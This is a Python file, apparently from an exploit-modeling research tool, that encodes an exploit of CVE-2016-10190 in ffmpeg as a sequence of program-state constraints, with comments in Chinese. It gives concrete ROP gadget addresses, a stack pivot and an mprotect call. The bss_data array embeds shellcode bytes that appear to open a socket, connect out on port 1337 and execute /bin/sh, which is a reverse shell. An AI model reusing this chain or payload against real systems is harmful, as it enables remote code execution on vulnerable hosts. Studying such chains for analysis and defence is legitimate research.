# -*- coding: utf-8 -*-
from program_state.expressions import *
from program_state.constraint import *
from program_state.variables import *
from program_state.state import *


def construct_reg_eq_constraint(reg_name, target_value, comments):
    ip_expr = VIRExpression(reg_name, is_unsigned=1, bit_width=64)
    target_expr = ConstExpression(target_value)
    eq_expr = EqExpression(ip_expr, target_expr)
    cons = Constraint(comments=comments)
    cons.add_expression(eq_expr)
    return cons


def construct_reg_ptr_offset_constraint(reg_name, offset, value_list, comments):
    reg_value_expr = get_int_from_register(reg_name, is_unsigned=1, bit_width=64)
    index = 0
    cons = Constraint(comments=comments)
    for value in value_list:
        mem_value_expr = get_int_from_memory(AddExpression(reg_value_expr, ConstExpression(offset + index)),
                                             is_unsigned=1, bit_width=8)
        cons.add_expression(EqExpression(mem_value_expr, ConstExpression(value)))
        index += 1
    return cons


bss_data = [108, 142, 64, 0, 0, 0, 0, 0, 32, 96, 100, 1, 0, 0, 0, 0, 153, 139, 64, 0, 0, 0, 0, 0,
            72, 49, 192, 72, 49, 255, 72, 49, 132, 40, 66, 0, 0, 0, 0, 0, 108, 142, 64, 0, 0, 0, 0,
            0, 40, 96, 100, 1, 0, 0, 0, 0, 153, 139, 64, 0, 0, 0, 0, 0, 246, 72, 49, 210, 77, 49,
            192, 106, 132, 40, 66, 0, 0, 0, 0, 0, 108, 142, 64, 0, 0, 0, 0, 0, 48, 96, 100, 1, 0,
            0, 0, 0, 153, 139, 64, 0, 0, 0, 0, 0, 2, 95, 106, 1, 94, 106, 6, 90, 132, 40, 66, 0,
            0, 0, 0, 0, 108, 142, 64, 0, 0, 0, 0, 0, 56, 96, 100, 1, 0, 0, 0, 0, 153, 139, 64, 0,
            0, 0, 0, 0, 106, 41, 88, 15, 5, 73, 137, 192, 132, 40, 66, 0, 0, 0, 0, 0, 108, 142, 64,
            0, 0, 0, 0, 0, 64, 96, 100, 1, 0, 0, 0, 0, 153, 139, 64, 0, 0, 0, 0, 0, 72, 49, 246,
            77, 49, 210, 65, 82, 132, 40, 66, 0, 0, 0, 0, 0, 108, 142, 64, 0, 0, 0, 0, 0, 72, 96,
            100, 1, 0, 0, 0, 0, 153, 139, 64, 0, 0, 0, 0, 0, 198, 4, 36, 2, 102, 199, 68, 36, 132,
            40, 66, 0, 0, 0, 0, 0, 108, 142, 64, 0, 0, 0, 0, 0, 80, 96, 100, 1, 0, 0, 0, 0, 153,
            139, 64, 0, 0, 0, 0, 0, 2, 5, 57, 199, 68, 36, 4, 0, 132, 40, 66, 0, 0, 0, 0, 0, 108,
            142, 64, 0, 0, 0, 0, 0, 88, 96, 100, 1, 0, 0, 0, 0, 153, 139, 64, 0, 0, 0, 0, 0, 0,
            0, 0, 72, 137, 230, 106, 16, 132, 40, 66, 0, 0, 0, 0, 0, 108, 142, 64, 0, 0, 0, 0, 0,
            96, 96, 100, 1, 0, 0, 0, 0, 153, 139, 64, 0, 0, 0, 0, 0, 90, 65, 80, 95, 106, 42, 88,
            15, 132, 40, 66, 0, 0, 0, 0, 0, 108, 142, 64, 0, 0, 0, 0, 0, 104, 96, 100, 1, 0, 0,
            0, 0, 153, 139, 64, 0, 0, 0, 0, 0, 5, 72, 49, 246, 106, 3, 94, 72, 132, 40, 66, 0, 0,
            0, 0, 0, 108, 142, 64, 0, 0, 0, 0, 0, 112, 96, 100, 1, 0, 0, 0, 0, 153, 139, 64, 0,
            0, 0, 0, 0, 255, 206, 106, 33, 88, 15, 5, 117, 132, 40, 66, 0, 0, 0, 0, 0, 108, 142,
            64, 0, 0, 0, 0, 0, 120, 96, 100, 1, 0, 0, 0, 0, 153, 139, 64, 0, 0, 0, 0, 0, 246, 72,
            49, 255, 87, 87, 94, 90, 132, 40, 66, 0, 0, 0, 0, 0, 108, 142, 64, 0, 0, 0, 0, 0, 128,
            96, 100, 1, 0, 0, 0, 0, 153, 139, 64, 0, 0, 0, 0, 0, 72, 191, 47, 47, 98, 105, 110, 47,
            132, 40, 66, 0, 0, 0, 0, 0, 108, 142, 64, 0, 0, 0, 0, 0, 136, 96, 100, 1, 0, 0, 0, 0,
            153, 139, 64, 0, 0, 0, 0, 0, 115, 104, 72, 193, 239, 8, 87, 84, 132, 40, 66, 0, 0, 0,
            0, 0, 108, 142, 64, 0, 0, 0, 0, 0, 144, 96, 100, 1, 0, 0, 0, 0, 153, 139, 64, 0, 0,
            0, 0, 0, 95, 106, 59, 88, 15, 5, 144, 144, 132, 40, 66, 0, 0, 0, 0, 0]

mprotect_rop_data = [121, 127, 64, 0, 0, 0, 0, 0, 0, 96, 100, 1, 0, 0, 0, 0, 108, 142, 64, 0, 0, 0,
                     0, 0, 0, 5, 0, 0, 0, 0, 0, 0, 153, 139, 64, 0, 0, 0, 0, 0, 7, 0, 0, 0, 0, 0,
                     0, 0, 240, 113, 64, 0, 0, 0, 0, 0]

# all states related in exploit of CVE-2016-10190 in order
exp_10190 = StateChain()

# state 1
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "ffmpeg 入口地址",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4703088
            }
        }
    }
],
'''
s1 = State(name="state_1")
s1.add_constraint(construct_reg_eq_constraint('ip', 4703088, "ffmpeg 入口地址"))

# state 2
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "控制流截获点",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 6061448
            }
        }
    },
    {
        "type": "reg",
        "param": "rax",
        "comment": "布局栈迁移第 1 个 Gadget",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "data": 4225833
            }
        }
    },
    {
        "type": "regmem",
        "param": "rbx",
        "offset": 40,
        "comment": "布局栈迁移第 2 个 Gadget",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": [
                    41,
                    123,
                    64,
                    0,
                    0,
                    0,
                    0,
                    0
                ]
            }
        }
    }
],
'''
s2 = State(name="state_2")
s2.add_constraint(construct_reg_eq_constraint('ip', 6061448, "控制流截获点"))
s2.add_constraint(construct_reg_eq_constraint('rax', 4225833, "布局栈迁移第 1 个 Gadget"))
s2.add_constraint(construct_reg_ptr_offset_constraint('rbx', 40,
                                                      [41, 123, 64, 0, 0, 0, 0, 0], "布局栈迁移第 2 个 Gadget"))

# state 3
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行栈迁移第 1 个 gadget",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 19818031
            }
        }
    }
],
'''
s3 = State(name="state_3")
s3.add_constraint(construct_reg_eq_constraint('ip', 19818031, "执行栈迁移第 1 个 gadget"))

# state 4
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行栈迁移第 2 个 gadget 首指令",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4225833
            }
        }
    }
],
'''
s4 = State(name="state_4")
s4.add_constraint(construct_reg_eq_constraint('ip', 4225833, "执行栈迁移第 2 个 gadget 首指令"))

# state 5
'''
[
        {
            "type": "reg",
            "param": "ip",
            "comment": "执行栈迁移第 2 个 gadget 尾指令",
            "constraint": {
                "concrete": 1,
                "data": {
                    "composite": 0,
                    "value": 4225834
                }
            }
        },
        {
            "type": "regmem",
            "param": "sp",
            "offset": 8,
            "comment": "栈迁移执行后，下一个位置的栈数据可控",
            "constraint": {
                "concrete": 0,
                "data": [
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0
                ]
            }
        },
        {
            "type": "regmem",
            "param": "rbx",
            "offset": 0,
            "comment": "布局第 1 次调整栈空间的 Gadget",
            "constraint": {
                "concrete": 1,
                "data": {
                    "composite": 0,
                    "value": [
                        154,
                        13,
                        72,
                        0,
                        0,
                        0,
                        0,
                        0
                    ]
                }
            }
        },
        {
            "type": "regmem",
            "param": "rbx",
            "offset": 96,
            "comment": "布局第 2 次调整栈空间的 Gadget",
            "constraint": {
                "concrete": 1,
                "data": {
                    "composite": 0,
                    "value": [
                        154,
                        13,
                        72,
                        0,
                        0,
                        0,
                        0,
                        0
                    ]
                }
            }
        },
        {
            "type": "regmem",
            "param": "rbx",
            "offset": 192,
            "comment": "布局写 shellcode 到 BSS 的 gadget",
            "constraint": {
                "concrete": 1,
                "data": {
                    "composite": 0,
                    "value": bss_data
                }
            }
        }
    ],
'''
s5 = State(name="state_5")
s5.add_constraint(construct_reg_eq_constraint('ip', 4225834, "执行栈迁移第 2 个 gadget 尾指令"))
s5.add_constraint(construct_reg_ptr_offset_constraint('sp', 8,
                                                      [0, 0, 0, 0, 0, 0, 0, 0], "栈迁移执行后，下一个位置的栈数据可控"))
s5.add_constraint(construct_reg_ptr_offset_constraint('rbx', 0,
                                                      [154, 13, 72, 0, 0, 0, 0, 0], "布局第 1 次调整栈空间的 Gadget"))
s5.add_constraint(construct_reg_ptr_offset_constraint('rbx', 96,
                                                      [154, 13, 72, 0, 0, 0, 0, 0], "布局第 2 次调整栈空间的 Gadget"))
s5.add_constraint(construct_reg_ptr_offset_constraint('rbx', 192,
                                                      bss_data, "布局写 shellcode 到 BSS 的 gadget"))

# state 6
'''   
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行写 shellcode 到 BSS 的第 1 段 ROP Gadget [pop rsi; ret]首指令",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4230764
            }
        }
    }
],
'''
s6 = State(name="state_6")
s6.add_constraint(construct_reg_eq_constraint('ip', 4230764, "执行写 shellcode 到 BSS 的第 1 段 ROP Gadget [pop rsi; ret]首指令"))

# state 7
'''
    [
        {
            "type": "reg",
            "param": "ip",
            "comment": "执行写 shellcode 到 BSS 的第 1 段 ROP Gadget [pop rsi; ret]尾指令",
            "constraint": {
                "concrete": 1,
                "data": {
                    "composite": 0,
                    "value": 4230765
                }
            }
        }
    ],
'''
s7 = State(name="state_7")
s7.add_constraint(construct_reg_eq_constraint('ip', 4230765, "执行写 shellcode 到 BSS 的第 1 段 ROP Gadget [pop rsi; ret]尾指令"))

# state 8
'''
    [
        {
            "type": "reg",
            "param": "ip",
            "comment": "执行写 shellcode 到 BSS 的第 1 段 ROP Gadget [pop rdx; ret]首指令",
            "constraint": {
                "concrete": 1,
                "data": {
                    "composite": 0,
                    "value": 4230041
                }
            }
        }
    ],
'''
s8 = State(name="state_8")
s8.add_constraint(construct_reg_eq_constraint('ip', 4230041, "执行写 shellcode 到 BSS 的第 1 段 ROP Gadget [pop rdx; ret]首指令"))

# state 9
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行写 shellcode 到 BSS 的第 1 段 ROP Gadget [pop rdx; ret]尾指令",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4230042
            }
        }
    }
],
'''
s9 = State(name="state_9")
s9.add_constraint(construct_reg_eq_constraint('ip', 4230042, "执行写 shellcode 到 BSS 的第 1 段 ROP Gadget [pop rdx; ret]尾指令"))

# state 10
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行写 shellcode 到 BSS 的第 1 段 ROP Gadget [mov qword ptr [rsi], rdx; ret]首指令",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4335748
            }
        }
    }
],
'''
s10 = State(name="state_10")
s10.add_constraint(construct_reg_eq_constraint('ip', 4335748,
                                               "执行写 shellcode 到 BSS 的第 1 段 ROP Gadget [mov qword ptr [rsi], rdx; ret]首指令"))

# state 11
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行写 shellcode 到 BSS 的第 1 段 ROP Gadget [mov qword ptr [rsi], rdx; ret]尾指令",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4335751
            }
        }
    }
],
'''
s11 = State(name="state_11")
s11.add_constraint(construct_reg_eq_constraint('ip', 4335751, "执行写 shellcode 到 BSS 的第 1 段 ROP Gadget [mov qword ptr ["
                                                              "rsi], rdx; ret]尾指令"))

# state 12
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行写 shellcode 到 BSS 的第 14 段 ROP Gadget [pop rsi; ret]首指令",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4230764
            }
        }
    }
],
'''
s12 = State(name="state_12")
s12.add_constraint(construct_reg_eq_constraint('ip', 4230764, "执行写 shellcode 到 BSS 的第 14 段 ROP Gadget [pop rsi; "
                                                              "ret]首指令"))

# state 13
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行写 shellcode 到 BSS 的第 14 段 ROP Gadget [pop rsi; ret]尾指令",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4230765
            }
        }
    }
],
'''
s13 = State(name="state_13")
s13.add_constraint(
    construct_reg_eq_constraint('ip', 4230765, "执行写 shellcode 到 BSS 的第 14 段 ROP Gadget [pop rsi; ret]尾指令"))

# state 14
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行写 shellcode 到 BSS 的第 14 段 ROP Gadget [pop rdx; ret]首指令",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4230041
            }
        }
    }
],
'''
s14 = State(name="state_14")
s14.add_constraint(
    construct_reg_eq_constraint('ip', 4230041, "执行写 shellcode 到 BSS 的第 14 段 ROP Gadget [pop rdx; ret]首指令"))

# state 15
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行写 shellcode 到 BSS 的第 14 段 ROP Gadget [pop rdx; ret]尾指令",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4230042
            }
        }
    }
],
'''
s15 = State(name="state_15")
s15.add_constraint(construct_reg_eq_constraint('ip', 4230042, "执行写 shellcode 到 BSS 的第 14 段 ROP Gadget [pop rdx; "
                                                              "ret]尾指令"))

# state 16
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行写 shellcode 到 BSS 的第 14 段 ROP Gadget [mov qword ptr [rsi], rdx; ret]首指令",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4335748
            }
        }
    }
],
'''
s16 = State(name="state_16")
s16.add_constraint(construct_reg_eq_constraint('ip', 4335748,
                                               "执行写 shellcode 到 BSS 的第 14 段 ROP Gadget [mov qword ptr [rsi], rdx; ret]首指令"))

# state 17
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行写 shellcode 到 BSS 的第 14 段 ROP Gadget [mov qword ptr [rsi], rdx; ret]尾指令",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4335751
            }
        }
    }
],
'''
s17 = State(name="state_17")
s17.add_constraint(construct_reg_eq_constraint('ip', 4335751,
                                               "执行写 shellcode 到 BSS 的第 14 段 ROP Gadget [mov qword ptr [rsi], rdx; ret]尾指令"))

# state 18
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行写 shellcode 到 BSS 的第 15 段 ROP Gadget [pop rsi; ret]首指令",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4230764
            }
        }
    }
],
'''
s18 = State(name="state_18")
s18.add_constraint(
    construct_reg_eq_constraint('ip', 4230764, "执行写 shellcode 到 BSS 的第 15 段 ROP Gadget [pop rsi; ret]首指令"))

# state 19
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行写 shellcode 到 BSS 的第 15 段 ROP Gadget [pop rsi; ret]尾指令",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4230765
            }
        }
    }
],
'''
s19 = State(name="state_19")
s19.add_constraint(
    construct_reg_eq_constraint('ip', 4230765, "执行写 shellcode 到 BSS 的第 15 段 ROP Gadget [pop rsi; ret]尾指令"))

# state 20
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行写 shellcode 到 BSS 的第 15 段 ROP Gadget [pop rdx; ret]首指令",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4230041
            }
        }
    }
],
'''
s20 = State(name="state_20")
s20.add_constraint(
    construct_reg_eq_constraint('ip', 4230041, "执行写 shellcode 到 BSS 的第 15 段 ROP Gadget [pop rdx; ret]首指令"))

# state 21
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行写 shellcode 到 BSS 的第 15 段 ROP Gadget [pop rdx; ret]尾指令",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4230042
            }
        }
    }
],
'''
s21 = State(name="state_21")
s21.add_constraint(
    construct_reg_eq_constraint('ip', 4230042, "执行写 shellcode 到 BSS 的第 15 段 ROP Gadget [pop rdx; ret]尾指令"))

# state 22
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行写 shellcode 到 BSS 的第 15 段 ROP Gadget [mov qword ptr [rsi], rdx; ret]首指令",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4335748
            }
        }
    }
],
'''
s22 = State(name="state_22")
s22.add_constraint(construct_reg_eq_constraint('ip', 4335748,
                                               "执行写 shellcode 到 BSS 的第 15 段 ROP Gadget [mov qword ptr [rsi], rdx; ret]首指令"))

# state 23
'''
[
        {
            "type": "reg",
            "param": "ip",
            "comment": "执行写 shellcode 到 BSS 的第 15 段 ROP Gadget [mov qword ptr [rsi], rdx; ret]尾指令",
            "constraint": {
                "concrete": 1,
                "data": {
                    "composite": 0,
                    "value": 4335751
                }
            }
        },
        {
            "type": "regmem",
            "param": "rbx",
            "offset": 792,
            "comment": "布局 mprotect 的 rop gadget",
            "constraint": {
                "concrete": 1,
                "data": {
                    "composite": 0,
                    "value": mprotect_rop_data
                }
            }
        }
    ],
'''
s23 = State(name="state_23")
s23.add_constraint(construct_reg_eq_constraint('ip', 4335751,
                                               "执行写 shellcode 到 BSS 的第 15 段 ROP Gadget [mov qword ptr [rsi], rdx; ret]尾指令"))
s23.add_constraint(construct_reg_ptr_offset_constraint('rbx', 792, mprotect_rop_data, "布局 mprotect 的 rop gadget"))

# state 24
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行 mprotect 第 1 个参数设置 gadget:[pop rdi; ret]",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4226937
            }
        }
    }
],
'''
s24 = State(name="state_24")
s24.add_constraint(construct_reg_eq_constraint('ip', 4226937, "执行 mprotect 第 1 个参数设置 gadget:[pop rdi; ret]"))

# state 25
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行 mprotect 第 2 个参数设置 gadget:[pop rsi; ret]",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4226937
            }
        }
    }
],
'''
s25 = State(name="state_25")
s25.add_constraint(construct_reg_eq_constraint('ip', 4226937, "执行 mprotect 第 2 个参数设置 gadget:[pop rsi; ret]"))

# state 26
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行 mprotect 第 3 个参数设置 gadget:[pop rdx; ret]",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 4230041
            }
        }
    }
],
'''
s26 = State(name="state_26")
s26.add_constraint(construct_reg_eq_constraint('ip', 4230041, "执行 mprotect 第 3 个参数设置 gadget:[pop rdx; ret]"))

# state 27
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行到 mprotect@plt 入口",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 7
            }
        }
    }
],
'''
s27 = State(name="state_27")
s27.add_constraint(construct_reg_eq_constraint('ip', 7, "执行到 mprotect@plt 入口"))

# state 28
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "执行到 mprotect 的返回地址",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 1,
                "value": {
                    "base": {
                        "is_symbol": 1,
                        "value": "libc-2.23.So"
                    },
                    "offset": 1054847
                }
            }
        }
    },
    {
        "type": "regmem",
        "param": "sp",
        "offset": 8,
        "comment": "mprotect 返回地址设置为 shellcode",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": [
                    32,
                    96,
                    100,
                    1,
                    0,
                    0,
                    0,
                    0
                ]
            }
        }
    }
],
'''
s28 = State(name="state_28")
s28.add_constraint(construct_reg_eq_constraint('ip', OFBExpression('libc-2.23.so', ConstExpression(1054847)),
                                                                   "执行到 mprotect 的返回地址"))
s28.add_constraint(
    construct_reg_ptr_offset_constraint('sp', 8, [32, 96, 100, 1, 0, 0, 0, 0], "mprotect 返回地址设置为 shellcode"))

# state 29
'''
[
    {
        "type": "reg",
        "param": "ip",
        "comment": "返回至 Shellcode",
        "constraint": {
            "concrete": 1,
            "data": {
                "composite": 0,
                "value": 23355424
            }
        }
    }
]
'''
s29 = State(name="state_29")
s29.add_constraint(construct_reg_eq_constraint('ip', 23355424, "返回至 Shellcode"))

exp_10190.append_state(s1)
exp_10190.append_state(s2)
exp_10190.append_state(s3)
exp_10190.append_state(s4)
exp_10190.append_state(s5)
exp_10190.append_state(s6)
exp_10190.append_state(s7)
exp_10190.append_state(s8)
exp_10190.append_state(s9)
exp_10190.append_state(s10)
exp_10190.append_state(s11)
exp_10190.append_state(s12)
exp_10190.append_state(s13)
exp_10190.append_state(s14)
exp_10190.append_state(s15)
exp_10190.append_state(s16)
exp_10190.append_state(s17)
exp_10190.append_state(s18)
exp_10190.append_state(s19)
exp_10190.append_state(s20)
exp_10190.append_state(s21)
exp_10190.append_state(s22)
exp_10190.append_state(s23)
exp_10190.append_state(s24)
exp_10190.append_state(s25)
exp_10190.append_state(s26)
exp_10190.append_state(s27)
exp_10190.append_state(s28)
exp_10190.append_state(s29)

# print(exp_10190.num_states)
# for index in range(0, exp_10190.num_states):
#     state = exp_10190.get_state_by_index(index)
#     print(state)
print(s2)
print(s28)
print(s29)
